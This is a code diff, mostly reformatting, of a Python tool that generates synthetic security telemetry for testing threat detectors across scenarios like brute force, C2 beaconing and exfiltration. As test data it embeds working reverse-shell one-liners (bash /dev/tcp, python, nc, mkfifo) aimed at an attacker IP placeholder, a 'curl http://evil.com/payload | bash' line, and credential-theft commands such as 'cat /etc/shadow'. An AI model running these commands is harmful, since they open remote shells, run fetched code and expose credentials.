@@ -82,27 +82,29 @@ class EventGenerator:
             is_success = success_on_last and i == attempts - 1
             outcome = "SUCCESS" if is_success else "FAILURE"
 
-            events.append(TelemetryEventView(
-                event_id=self._next_id(),
-                device_id=self.device_id,
-                event_type="SECURITY",
-                severity="HIGH" if is_success else "MEDIUM",
-                timestamp=self._ts(offset),
-                attributes={
-                    "probe": "ssh_brute_force",
-                    "event_type": "protocol_threat",
-                },
-                security_event={
-                    "event_category": "AUTHENTICATION",
-                    "event_action": "SSH",
-                    "event_outcome": outcome,
-                    "user_name": user,
-                    "source_ip": src_ip,
-                    "risk_score": 0.3 if is_success else 0.6,
-                    "mitre_techniques": ["T1110", "T1021.004"],
-                    "requires_investigation": True,
-                },
-            ))
+            events.append(
+                TelemetryEventView(
+                    event_id=self._next_id(),
+                    device_id=self.device_id,
+                    event_type="SECURITY",
+                    severity="HIGH" if is_success else "MEDIUM",
+                    timestamp=self._ts(offset),
+                    attributes={
+                        "probe": "ssh_brute_force",
+                        "event_type": "protocol_threat",
+                    },
+                    security_event={
+                        "event_category": "AUTHENTICATION",
+                        "event_action": "SSH",
+                        "event_outcome": outcome,
+                        "user_name": user,
+                        "source_ip": src_ip,
+                        "risk_score": 0.3 if is_success else 0.6,
+                        "mitre_techniques": ["T1110", "T1021.004"],
+                        "requires_investigation": True,
+                    },
+                )
+            )
         return events
 
     # ── Persistence After Auth (SC-08) ────────────────────────────
@@ -123,49 +125,53 @@ class EventGenerator:
         events = []
 
         # Event 1: Successful SSH login
-        events.append(TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="SECURITY",
-            severity="HIGH",
-            timestamp=self._ts(300),  # 5 minutes ago
-            attributes={
-                "probe": "ssh_brute_force",
-                "event_type": "protocol_threat",
-            },
-            security_event={
-                "event_category": "AUTHENTICATION",
-                "event_action": "SSH",
-                "event_outcome": "SUCCESS",
-                "user_name": username,
-                "source_ip": src_ip,
-                "risk_score": 0.3,
-                "mitre_techniques": ["T1021.004"],
-                "requires_investigation": False,
-            },
-        ))
+        events.append(
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="SECURITY",
+                severity="HIGH",
+                timestamp=self._ts(300),  # 5 minutes ago
+                attributes={
+                    "probe": "ssh_brute_force",
+                    "event_type": "protocol_threat",
+                },
+                security_event={
+                    "event_category": "AUTHENTICATION",
+                    "event_action": "SSH",
+                    "event_outcome": "SUCCESS",
+                    "user_name": username,
+                    "source_ip": src_ip,
+                    "risk_score": 0.3,
+                    "mitre_techniques": ["T1021.004"],
+                    "requires_investigation": False,
+                },
+            )
+        )
 
         # Event 2: Persistence mechanism installed (within 10 min of auth)
-        events.append(TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="AUDIT",
-            severity="HIGH",
-            timestamp=self._ts(120),  # 2 minutes ago (3 min after SSH)
-            attributes={
-                "probe": "persistence_detector",
-                "event_type": "persistence_threat",
-                "file_path": plist_path,
-            },
-            audit_event={
-                "audit_category": "CHANGE",
-                "action_performed": "CREATED",
-                "object_type": "LAUNCH_AGENT",
-                "object_id": plist_path,
-                "before_value": "",
-                "after_value": "com.evil.agent",
-            },
-        ))
+        events.append(
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="AUDIT",
+                severity="HIGH",
+                timestamp=self._ts(120),  # 2 minutes ago (3 min after SSH)
+                attributes={
+                    "probe": "persistence_detector",
+                    "event_type": "persistence_threat",
+                    "file_path": plist_path,
+                },
+                audit_event={
+                    "audit_category": "CHANGE",
+                    "action_performed": "CREATED",
+                    "object_type": "LAUNCH_AGENT",
+                    "object_id": plist_path,
+                    "before_value": "",
+                    "after_value": "com.evil.agent",
+                },
+            )
+        )
 
         return events
 
@@ -180,31 +186,33 @@ class EventGenerator:
         """Generate reverse shell execution event."""
         cmd_map = {
             "bash_dev_tcp": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
-            "python": f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+            "python": f'python3 -c \'import socket,subprocess;s=socket.socket();s.connect(("{attacker_ip}",{attacker_port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
             "nc": f"nc -e /bin/sh {attacker_ip} {attacker_port}",
             "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f",
         }
 
-        return [TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="PROCESS",
-            severity="CRITICAL",
-            timestamp=self._ts(0),
-            attributes={
-                "probe": "reverse_shell_detector",
-                "event_type": "process_threat",
-                "command": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
-            },
-            process_event={
-                "process_name": method.split("_")[0],
-                "pid": 31337,
-                "ppid": 1,
-                "uid": 0,
-                "command_line": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
-                "executable_path": f"/usr/bin/{method.split('_')[0]}",
-            },
-        )]
+        return [
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="PROCESS",
+                severity="CRITICAL",
+                timestamp=self._ts(0),
+                attributes={
+                    "probe": "reverse_shell_detector",
+                    "event_type": "process_threat",
+                    "command": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
+                },
+                process_event={
+                    "process_name": method.split("_")[0],
+                    "pid": 31337,
+                    "ppid": 1,
+                    "uid": 0,
+                    "command_line": cmd_map.get(method, cmd_map["bash_dev_tcp"]),
+                    "executable_path": f"/usr/bin/{method.split('_')[0]}",
+                },
+            )
+        ]
 
     # ── C2 Beaconing (SC-10) ─────────────────────────────────────
 
@@ -221,27 +229,29 @@ class EventGenerator:
 
         for i in range(beacon_count):
             offset = base_offset - (i * interval_seconds)
-            events.append(TelemetryEventView(
-                event_id=self._next_id(),
-                device_id=self.device_id,
-                event_type="FLOW",
-                severity="MEDIUM",
-                timestamp=self._ts(offset),
-                attributes={
-                    "probe": "c2_beacon_detector",
-                    "event_type": "network_threat",
-                    "beacon_interval": str(interval_seconds),
-                },
-                flow_event={
-                    "src_ip": "10.0.0.50",
-                    "src_port": 49000 + i,
-                    "dst_ip": c2_ip,
-                    "dst_port": c2_port,
-                    "protocol": "TCP",
-                    "bytes_sent": 256,
-                    "bytes_received": 128,
-                },
-            ))
+            events.append(
+                TelemetryEventView(
+                    event_id=self._next_id(),
+                    device_id=self.device_id,
+                    event_type="FLOW",
+                    severity="MEDIUM",
+                    timestamp=self._ts(offset),
+                    attributes={
+                        "probe": "c2_beacon_detector",
+                        "event_type": "network_threat",
+                        "beacon_interval": str(interval_seconds),
+                    },
+                    flow_event={
+                        "src_ip": "10.0.0.50",
+                        "src_port": 49000 + i,
+                        "dst_ip": c2_ip,
+                        "dst_port": c2_port,
+                        "protocol": "TCP",
+                        "bytes_sent": 256,
+                        "bytes_received": 128,
+                    },
+                )
+            )
         return events
 
     # ── Data Exfiltration (SC-11) ─────────────────────────────────
@@ -252,56 +262,60 @@ class EventGenerator:
         bytes_sent: int = 50_000_000,
     ) -> List[TelemetryEventView]:
         """Generate large outbound transfer event (data exfil)."""
-        return [TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="FLOW",
-            severity="HIGH",
-            timestamp=self._ts(0),
-            attributes={
-                "probe": "data_exfil_detector",
-                "event_type": "exfiltration_threat",
-                "bytes_sent": str(bytes_sent),
-            },
-            flow_event={
-                "src_ip": "10.0.0.50",
-                "src_port": 55000,
-                "dst_ip": dst_ip,
-                "dst_port": 443,
-                "protocol": "TCP",
-                "bytes_sent": bytes_sent,
-                "bytes_received": 1024,
-            },
-        )]
+        return [
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="FLOW",
+                severity="HIGH",
+                timestamp=self._ts(0),
+                attributes={
+                    "probe": "data_exfil_detector",
+                    "event_type": "exfiltration_threat",
+                    "bytes_sent": str(bytes_sent),
+                },
+                flow_event={
+                    "src_ip": "10.0.0.50",
+                    "src_port": 55000,
+                    "dst_ip": dst_ip,
+                    "dst_port": 443,
+                    "protocol": "TCP",
+                    "bytes_sent": bytes_sent,
+                    "bytes_received": 1024,
+                },
+            )
+        ]
 
     # ── LOLBin Abuse (SC-12) ─────────────────────────────────────
 
     def lolbin_abuse(
         self,
         binary: str = "osascript",
-        command: str = 'osascript -e \'do shell script "curl http://evil.com/payload | bash"\'',
+        command: str = "osascript -e 'do shell script \"curl http://evil.com/payload | bash\"'",
     ) -> List[TelemetryEventView]:
         """Generate living-off-the-land binary abuse event."""
-        return [TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="PROCESS",
-            severity="HIGH",
-            timestamp=self._ts(0),
-            attributes={
-                "probe": "lolbin_detector",
-                "event_type": "process_threat",
-                "binary": binary,
-            },
-            process_event={
-                "process_name": binary,
-                "pid": 12345,
-                "ppid": 1,
-                "uid": 501,
-                "command_line": command,
-                "executable_path": f"/usr/bin/{binary}",
-            },
-        )]
+        return [
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="PROCESS",
+                severity="HIGH",
+                timestamp=self._ts(0),
+                attributes={
+                    "probe": "lolbin_detector",
+                    "event_type": "process_threat",
+                    "binary": binary,
+                },
+                process_event={
+                    "process_name": binary,
+                    "pid": 12345,
+                    "ppid": 1,
+                    "uid": 501,
+                    "command_line": command,
+                    "executable_path": f"/usr/bin/{binary}",
+                },
+            )
+        ]
 
     # ── Benign Baselines (SC-01 through SC-05) ───────────────────
 
@@ -318,45 +332,49 @@ class EventGenerator:
 
         for i in range(cycles):
             offset = (cycles - i) * 30
-            events.append(TelemetryEventView(
-                event_id=self._next_id(),
-                device_id=self.device_id,
-                event_type="METRIC",
-                severity="INFO",
-                timestamp=self._ts(offset),
-                attributes={
-                    "probe": "agent_metrics",
-                    "event_type": "agent_metrics",
-                    "loops_started": str(i + 1),
-                    "loops_succeeded": str(i + 1),
-                    "events_emitted": "0",
-                },
-            ))
+            events.append(
+                TelemetryEventView(
+                    event_id=self._next_id(),
+                    device_id=self.device_id,
+                    event_type="METRIC",
+                    severity="INFO",
+                    timestamp=self._ts(offset),
+                    attributes={
+                        "probe": "agent_metrics",
+                        "event_type": "agent_metrics",
+                        "loops_started": str(i + 1),
+                        "loops_succeeded": str(i + 1),
+                        "events_emitted": "0",
+                    },
+                )
+            )
         return events
 
     def benign_ssh_to_known_host(self) -> List[TelemetryEventView]:
         """Single SSH key-based auth to known server — zero alerts expected."""
-        return [TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="SECURITY",
-            severity="INFO",
-            timestamp=self._ts(0),
-            attributes={
-                "probe": "ssh_monitor",
-                "event_type": "protocol_threat",
-            },
-            security_event={
-                "event_category": "AUTHENTICATION",
-                "event_action": "SSH",
-                "event_outcome": "SUCCESS",
-                "user_name": "ubuntu",
-                "source_ip": "10.0.0.50",
-                "risk_score": 0.05,
-                "mitre_techniques": [],
-                "requires_investigation": False,
-            },
-        )]
+        return [
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="SECURITY",
+                severity="INFO",
+                timestamp=self._ts(0),
+                attributes={
+                    "probe": "ssh_monitor",
+                    "event_type": "protocol_threat",
+                },
+                security_event={
+                    "event_category": "AUTHENTICATION",
+                    "event_action": "SSH",
+                    "event_outcome": "SUCCESS",
+                    "user_name": "ubuntu",
+                    "source_ip": "10.0.0.50",
+                    "risk_score": 0.05,
+                    "mitre_techniques": [],
+                    "requires_investigation": False,
+                },
+            )
+        ]
 
     # ── Credential Theft (SC-15) ─────────────────────────────────
 
@@ -370,28 +388,30 @@ class EventGenerator:
             "shadow_read": "cat /etc/shadow",
             "mimikatz": "sekurlsa::logonpasswords",
         }
-        return [TelemetryEventView(
-            event_id=self._next_id(),
-            device_id=self.device_id,
-            event_type="SECURITY",
-            severity="CRITICAL",
-            timestamp=self._ts(0),
-            attributes={
-                "probe": "credential_detector",
-                "event_type": "credential_threat",
-                "technique": technique,
-            },
-            security_event={
-                "event_category": "CREDENTIAL_ACCESS",
-                "event_action": "DETECTED",
-                "event_outcome": "attempted",
-                "user_name": "attacker",
-                "source_ip": "10.0.0.50",
-                "risk_score": 0.95,
-                "mitre_techniques": ["T1555", "T1003"],
-                "requires_investigation": True,
-            },
-        )]
+        return [
+            TelemetryEventView(
+                event_id=self._next_id(),
+                device_id=self.device_id,
+                event_type="SECURITY",
+                severity="CRITICAL",
+                timestamp=self._ts(0),
+                attributes={
+                    "probe": "credential_detector",
+                    "event_type": "credential_threat",
+                    "technique": technique,
+                },
+                security_event={
+                    "event_category": "CREDENTIAL_ACCESS",
+                    "event_action": "DETECTED",
+                    "event_outcome": "attempted",
+                    "user_name": "attacker",
+                    "source_ip": "10.0.0.50",
+                    "risk_score": 0.95,
+                    "mitre_techniques": ["T1555", "T1003"],
+                    "requires_investigation": True,
+                },
+            )
+        ]
 
     # ── Composite Attack Chain (SC-20) ───────────────────────────
 
@@ -404,9 +424,9 @@ class EventGenerator:
         Returns events across multiple MITRE stages.
         """
         events = []
-        events.extend(self.ssh_brute_force(
-            attempts=5, src_ip=src_ip, success_on_last=True
-        ))
+        events.extend(
+            self.ssh_brute_force(attempts=5, src_ip=src_ip, success_on_last=True)
+        )
         events.extend(self.persistence_after_auth(src_ip=src_ip))
         events.extend(self.credential_access())
         events.extend(self.c2_beaconing(beacon_count=3, c2_ip=src_ip))
@@ -499,10 +519,21 @@ def _event_to_dict(ev: TelemetryEventView) -> dict:
 def main():
     parser = argparse.ArgumentParser(description="AMOSKYS Event Generator")
     parser.add_argument("--scenario", type=str, help="Scenario name")
-    parser.add_argument("--list-scenarios", action="store_true", help="List all scenarios")
-    parser.add_argument("--count", type=int, default=5, help="Number of events for parameterized scenarios")
-    parser.add_argument("--device-id", type=str, default="test-host-001", help="Device ID")
-    parser.add_argument("--output", type=str, default="-", help="Output file (- for stdout)")
+    parser.add_argument(
+        "--list-scenarios", action="store_true", help="List all scenarios"
+    )
+    parser.add_argument(
+        "--count",
+        type=int,
+        default=5,
+        help="Number of events for parameterized scenarios",
+    )
+    parser.add_argument(
+        "--device-id", type=str, default="test-host-001", help="Device ID"
+    )
+    parser.add_argument(
+        "--output", type=str, default="-", help="Output file (- for stdout)"
+    )
     args = parser.parse_args()
 
     if args.list_scenarios:
